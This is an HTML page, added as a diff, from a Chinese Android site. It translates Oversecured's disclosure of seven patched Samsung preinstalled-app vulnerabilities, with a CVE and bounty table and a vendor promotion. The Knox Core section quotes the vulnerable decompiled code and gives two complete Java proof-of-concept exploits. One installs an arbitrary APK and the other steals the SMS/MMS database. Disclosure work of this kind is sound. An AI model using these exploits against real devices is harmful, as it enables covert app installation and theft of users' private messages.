@@ -1,0 +1,244 @@
+<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=http://droid10.com/Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/ rel=canonical><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.2.3, mkdocs-material-8.2.1"><title>黑客可以利用三星预装的应用程序来监视用户 - 安卓10</title><link rel=stylesheet href=../../assets/stylesheets/main.e8d9bf0c.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#_1 class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../.. title=安卓10 class="md-header__button md-logo" aria-label=安卓10 data-md-component=logo> <img src=../../img/droid10.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 安卓10 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> 黑客可以利用三星预装的应用程序来监视用户 </span> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=查找> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=分享 data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/Humilton/droid10/ title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> Humilton/droid10 </div> </a> </div> </nav> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> 主页 </a> </li> <li class=md-tabs__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-tabs__link> 环境 </a> </li> <li class=md-tabs__item> <a href=../../Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/ class=md-tabs__link> 框架 </a> </li> <li class=md-tabs__item> <a href=./ class="md-tabs__link md-tabs__link--active"> 漏洞 </a> </li> <li class=md-tabs__item> <a href=../../App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/ class=md-tabs__link> 应用 </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=安卓10 class="md-nav__button md-logo" aria-label=安卓10 data-md-component=logo> <img src=../../img/droid10.png alt=logo> </a> 安卓10 </label> <div class=md-nav__source> <a href=https://github.com/Humilton/droid10/ title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> Humilton/droid10 </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> 主页 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=主页 data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> 主页 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> Android10 </a> </li> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> 环境 </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/ class=md-nav__link> 框架 </a> </li> <li class=md-nav__item> <a href=./ class=md-nav__link> 漏洞 </a> </li> <li class=md-nav__item> <a href=../../App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/ class=md-nav__link> 应用 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> 环境 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=环境 data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> 环境 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android10源码下载 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/ class=md-nav__link> Android基础操作 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> 框架 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=框架 data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> 框架 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/ class=md-nav__link> 恢复模式 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4 checked> <label class=md-nav__link for=__nav_4> 漏洞 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=漏洞 data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> 漏洞 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> 黑客可以利用三星预装的应用程序来监视用户 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> 黑客可以利用三星预装的应用程序来监视用户 </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 黑客可以利用三星预装的应用程序来监视用户 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 七个漏洞列表如下: </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 漏洞详情 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 漏洞详情列表： </a> </li> <li class=md-nav__item> <a href=#knox-core class=md-nav__link> Knox Core 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 安装任意应用程序的概念证明 </a> </li> <li class=md-nav__item> <a href=#smsmms class=md-nav__link> SMS/MMS 文件盗窃的概念证明 </a> <nav class=md-nav aria-label="SMS/MMS 文件盗窃的概念证明"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc class=md-nav__link> PoC 的工作原理如下： </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 托管供应中的漏洞 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 用于安装自定义应用程序并为其授予设备管理员权限的概念证明 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 安全文件夹中的漏洞 </a> </li> <li class=md-nav__item> <a href=#secsettings class=md-nav__link> SecSettings 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#dex-ui class=md-nav__link> 三星 DeX 系统 UI 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#telephonyui class=md-nav__link> TelephonyUI 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#phototable class=md-nav__link> PhotoTable 中的漏洞 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5> 应用 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=应用 data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> 应用 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/ class=md-nav__link> Android内存泄露优化总结 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 黑客可以利用三星预装的应用程序来监视用户 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 七个漏洞列表如下: </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 漏洞详情 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 漏洞详情列表： </a> </li> <li class=md-nav__item> <a href=#knox-core class=md-nav__link> Knox Core 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 安装任意应用程序的概念证明 </a> </li> <li class=md-nav__item> <a href=#smsmms class=md-nav__link> SMS/MMS 文件盗窃的概念证明 </a> <nav class=md-nav aria-label="SMS/MMS 文件盗窃的概念证明"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#poc class=md-nav__link> PoC 的工作原理如下： </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 托管供应中的漏洞 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 用于安装自定义应用程序并为其授予设备管理员权限的概念证明 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 安全文件夹中的漏洞 </a> </li> <li class=md-nav__item> <a href=#secsettings class=md-nav__link> SecSettings 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#dex-ui class=md-nav__link> 三星 DeX 系统 UI 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#telephonyui class=md-nav__link> TelephonyUI 中的漏洞 </a> </li> <li class=md-nav__item> <a href=#phototable class=md-nav__link> PhotoTable 中的漏洞 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/Humilton/droid10/edit/master/docs/Poc/黑客可以利用三星预装的应用程序来监视用户.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1>黑客可以利用三星预装的应用程序来监视用户</h1> <h2 id=_1>黑客可以利用三星预装的应用程序来监视用户</h2> <p>三星预装的 Android 应用程序中披露了多个严重的安全漏洞，如果成功利用这些漏洞，<strong>攻击者可能会在未经用户同意的情况下访问个人数据并控制设备。</strong></p> <p>“这些漏洞的影响可能允许攻击者访问和编辑受害者的联系人、电话、短信/彩信，安装具有设备管理员权限的任意应用程序，或代表系统用户读写任意文件，这可能会更改设备的设置，”移动安全初创公司 Oversecured 的创始人 Sergey Toshin在周四发布的一份分析报告中<a href=https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/ >表示</a>。</p> <p>Toshin 于 2021 年 2 月向三星报告了这些缺陷，随后制造商<a href=https://security.samsungmobile.com/securityUpdate.smsb>发布</a>了<a href=https://security.samsungmobile.com/securityUpdate.smsb>补丁，</a>作为其 4 月和 5 月的月度安全更新的一部分。</p> <h2 id=_2>七个漏洞列表如下:</h2> <ul> <li><strong>CVE-2021-25356</strong> – 托管供应中的第三方身份验证绕过</li> <li><strong>CVE-2021-25388</strong> – Knox Core 中的任意应用程序安装漏洞</li> <li><strong>CVE-2021-25390</strong> – <strong>PhotoTable 中的</strong>意图重定向</li> <li><strong>CVE-2021-25391</strong> – 安全文件夹中的意图重定向</li> <li><strong>CVE-2021-25392</strong> – 可以访问<strong>DeX 的</strong>通知策略文件</li> <li><strong>CVE-2021-25393</strong> – 可以作为系统用户对任意文件进行读/写访问（影响设置应用程序）</li> <li><strong>CVE-2021-25397</strong> – TelephonyUI 中的<strong>任意文件写入</strong></li> </ul> <p>这些漏洞的影响意味着它们可能被利用来安装任意第三方应用程序、授予设备管理员权限以删除其他已安装的应用程序或窃取敏感文件、以系统用户身份读取或写入任意文件，甚至执行特权操作。</p> <p>在概念验证 (PoC) 演示中，Oversecured 确定可以利用 PhotoTable 和 Secure Folder 中的意图重定向缺陷来劫持应用程序访问 SD 卡和读取存储在手机中的联系人的权限。同样，通过利用 CVE-2021-25397 和 CVE-2021-25392，攻击者可以用恶意内容覆盖存储 SMS/MMS 消息的文件，并从用户通知中窃取数据。</p> <p>建议三星设备所有者应用该公司的最新固件更新，以避免任何潜在的安全风险。</p> <h2 id=_3>漏洞详情</h2> <p>这些<strong>漏洞可能导致违反 GDPR</strong>，我们很高兴能够帮助三星及时识别和修复这些漏洞。</p> <p><strong>如果您是开发人员或应用程序所有者，您可以将 Oversecured 集成到您的 CI/CD 中，以主动保护您的应用程序免受这些漏洞的侵害。</strong>CI/CD 过程也可以使用插件完全自动化。我们的解决方案将持续监控您的应用程序，并在检测到任何新漏洞时提醒您。</p> <p>从<a href=https://oversecured.com/docs/quick-start/ >Quick Start</a>开始试用，开始保护您的应用程序，或者您可以<a href=https://oversecured.com/contact-us>在此处</a>联系我们以了解更多信息并获取演示。</p> <p>如果您是一名安全研究人员，您可以使用 Oversecured 的移动应用程序扫描器扫描这些错误，从而自动执行错误检测过程。您所要做的就是<a href=https://oversecured.com/sign-up>注册</a>并上传您的应用程序文件。我们的扫描仪将负责其余的工作。</p> <h2 id=_4>漏洞详情列表：</h2> <table> <thead> <tr> <th><strong>CVE</strong></th> <th><strong>SVE</strong></th> <th><strong>受影响的应用</strong></th> <th><strong>描述</strong></th> <th><strong>奖励金额</strong></th> </tr> </thead> <tbody> <tr> <td>CVE-2021-25388</td> <td>SVE-2021-20636</td> <td>Knox Core (com.samsung.android.knox.containercore)</td> <td>安装任意应用程序和设备范围内的任意文件盗窃</td> <td>1720 美元</td> </tr> <tr> <td><strong>CVE-2021-25356</strong></td> <td>SVE-2021-20733</td> <td>托管配置 (com.android.managedprovisioning)</td> <td><strong>安装第三方应用程序并授予他们设备管理员权限</strong></td> <td><strong>7000 美元</strong></td> </tr> <tr> <td>CVE-2021-25391</td> <td>SVE-2021-20500</td> <td>安全文件夹 (com.samsung.knox.securefolder)</td> <td>访问任意*内容提供商</td> <td>1050 美元</td> </tr> <tr> <td>CVE-2021-25393</td> <td>SVE-2021-20731</td> <td>SecSettings (com.android.settings)</td> <td>获得对任意*内容提供者的访问权限导致以系统用户身份（UID 1000）对任意文件进行读/写访问</td> <td>5460 美元</td> </tr> <tr> <td>CVE-2021-25392</td> <td>SVE-2021-20690</td> <td>三星 DeX 系统 UI (com.samsung.desktopsystemui)</td> <td>能够窃取通知策略配置</td> <td>330 美元</td> </tr> <tr> <td>CVE-2021-25397</td> <td>SVE-2021-20716</td> <td>TelephonyUI (com.samsung.android.app.telephonyui)</td> <td>（覆盖）将任意文件写入为 UID 1001</td> <td>4850 美元</td> </tr> <tr> <td>CVE-2021-25390</td> <td>SVE-2021-20724</td> <td>PhotoTable (com.android.dreams.phototable)</td> <td>意图重定向导致访问任意内容提供者</td> <td>280 美元</td> </tr> </tbody> </table> <h2 id=knox-core>Knox Core 中的漏洞</h2> <p>首先，我们扫描了 Knox Core 应用程序，发现从 SD 卡安装了一个应用程序：</p> <p><a href=https://www.ddosi.org/wp-content/uploads/2021/06/1-4.png><img alt=黑客可以利用三星预装的应用程序来监视用户 src=https://img.vjob.top/imgs/vjob_1-4.png></a> 事实证明，此功能是通过导出的服务激活的<code>com.samsung.android.knox.containercore.provisioning.DualDARInitService</code>：</p> <pre><code>&lt;service android:name=&quot;com.samsung.android.knox.containercore.provisioning.DualDARInitService&quot; android:exported=&quot;true&quot;&gt;
+   &lt;intent-filter&gt;
+       &lt;action android:name=&quot;com.samsung.android.knox.containercore.provisioning.DualDARInitService&quot;/&gt;
+   &lt;/intent-filter&gt;
+&lt;/service&gt;
+</code></pre> <p>攻击者可以通过<code>dualdar-config-client-location</code>参数传递任意 URI，该参数将被复制到<code>/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk</code>，这是一个世界可读的位置。</p> <p>之后，将启动应用程序安装过程：</p> <pre><code>private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) {
+   if (intent.getBooleanExtra(&quot;DUAL_DAR_IS_WPCOD&quot;, false)) {
+       int intExtra = intent.getIntExtra(&quot;android.intent.extra.user_handle&quot;, UserHandle.myUserId());
+       Bundle bundleExtra = intent.getBundleExtra(&quot;DUAL_DAR_PARAMS&quot;);
+       String string = bundleExtra.getString(&quot;dualdar-config-client-package&quot;, null);
+       if (!TextUtils.isEmpty(string)) {
+           DDLog.m4d(&quot;KNOXCORE::DualDARInitService&quot;, &quot;Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto&quot;);
+           String string2 = bundleExtra.getString(&quot;dualdar-config-client-location&quot;); // attacker-controlled URI
+           DDLog.m4d(&quot;KNOXCORE::DualDARInitService&quot;, &quot;DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = &quot; + string2);
+           if (TextUtils.isEmpty(string2)) {
+               notifyMPError(5);
+           } else if (string2.startsWith(&quot;file://&quot;)) {
+               String str = getExternalFilesDir(null) + &quot;/client_downloaded_knox_app.apk&quot;;
+               try {
+                   // attacker-controlled file is copied to the public location
+                   ((SemRemoteContentManager) this.mContext.getSystemService(&quot;rcp&quot;)).copyFile(intExtra, string2.replaceFirst(&quot;^file://&quot;, &quot;&quot;), intExtra, str);
+                   installPackageTask(intent, string, str); // and then installed
+               } catch (RemoteException unused) {
+                   DDLog.m3e(&quot;KNOXCORE::DualDARInitService&quot;, &quot;copyFile failed.&quot;);
+                   notifyMPError(5);
+               }
+           } else if (string2.startsWith(&quot;https://&quot;)) {
+               downloadPackageTask(intent, string, string2);
+           } else {
+               notifyMPError(5);
+           }
+       } else {
+           DDLog.m4d(&quot;KNOXCORE::DualDARInitService&quot;, &quot;Start proceedPrerequisiteForDualDARWithWPCOD native crypto&quot;);
+           startRunnerTask(intent);
+       }
+   }
+}
+</code></pre> <h2 id=_5>安装任意应用程序的概念证明</h2> <pre><code>protected void onCreate(Bundle savedInstanceState) {
+   super.onCreate(savedInstanceState);
+
+   try {
+       Bundle bundle = new Bundle();
+       bundle.putString(&quot;dualdar-config-client-package&quot;, &quot;test.exampleapp&quot;);
+       bundle.putString(&quot;dualdar-config-client-location&quot;, Uri.fromFile(copyFile()).toString());
+
+       Intent i = new Intent(&quot;com.samsung.android.knox.containercore.provisioning.DualDARInitService&quot;);
+       i.setClassName(&quot;com.samsung.android.knox.containercore&quot;, &quot;com.samsung.android.knox.containercore.provisioning.DualDARInitService&quot;);
+       i.putExtra(&quot;DualDARServiceEventFlag&quot;, 500);
+       i.putExtra(&quot;DUAL_DAR_IS_WPCOD&quot;, true);
+       i.putExtra(&quot;DUAL_DAR_PARAMS&quot;, bundle);
+       startService(i);
+   }
+   catch (Throwable th) {
+       throw new RuntimeException(th);
+   }
+}
+
+private File copyFile() throws Throwable {
+   File file = new File(getApplicationInfo().dataDir, &quot;app.apk&quot;);
+
+   InputStream i = getAssets().open(&quot;app-release.apk&quot;);
+   OutputStream o = new FileOutputStream(file);
+   IOUtils.copy(i, o);
+   i.close();
+   o.close();
+   return file;
+}
+
+</code></pre> <h2 id=smsmms>SMS/MMS 文件盗窃的概念证明</h2> <pre><code>protected void onCreate(Bundle savedInstanceState) {
+   super.onCreate(savedInstanceState);
+
+   startDump();
+
+   try {
+       File dbPath = new File(getPackageManager().getApplicationInfo(&quot;com.android.providers.telephony&quot;, 0).dataDir, &quot;databases/mmssms.db&quot;);
+
+       Bundle bundle = new Bundle();
+       bundle.putString(&quot;dualdar-config-client-package&quot;, &quot;test.exampleapp&quot;);
+       bundle.putString(&quot;dualdar-config-client-location&quot;, Uri.fromFile(dbPath).toString());
+
+       Intent i = new Intent(&quot;com.samsung.android.knox.containercore.provisioning.DualDARInitService&quot;);
+       i.setClassName(&quot;com.samsung.android.knox.containercore&quot;, &quot;com.samsung.android.knox.containercore.provisioning.DualDARInitService&quot;);
+       i.putExtra(&quot;DualDARServiceEventFlag&quot;, 500);
+       i.putExtra(&quot;DUAL_DAR_IS_WPCOD&quot;, true);
+       i.putExtra(&quot;DUAL_DAR_PARAMS&quot;, bundle);
+       new Thread(() -&gt; {
+           for(int j = 1; j &lt; 1000; j++) {
+               startService(i);
+               try {
+                   Thread.sleep(500);
+               } catch (Throwable th) {
+                   throw new RuntimeException(th);
+               }
+           }
+       }).start();
+   }
+   catch (Throwable th) {
+       throw new RuntimeException(th);
+   }
+}
+
+private void startDump() {
+   final String path = &quot;/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk&quot;;
+
+   ContentValues values = new ContentValues();
+   values.put(&quot;_data&quot;, path);
+   Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri(&quot;external&quot;), values);
+
+   new Thread(new Runnable() {
+       public void run() {
+           while (true) {
+               try {
+                   InputStream i = getContentResolver().openInputStream(uri);
+                   String data = IOUtils.toString(i);
+                   Log.d(&quot;evil&quot;, data);
+                   i.close();
+               } catch (Throwable th) {
+               }
+           }
+       }
+   }).start();
+}
